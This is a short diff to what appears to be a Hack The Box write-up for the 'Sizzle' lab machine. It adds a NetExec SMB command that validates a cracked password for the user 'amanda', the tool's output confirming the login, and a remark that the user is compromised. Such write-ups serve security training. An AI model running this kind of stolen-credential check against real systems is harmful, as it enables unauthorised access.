@@ -276,5 +276,9 @@ amanda:Ashare1972
 Ill now validate these credentials
 
 ```python
-
+nxc smb sizzle.htb.local -u 'amanda' -p 'Ashare1972'
+SMB         10.129.15.12    445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.15.12    445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972
 ```
+This user is now compromised
+
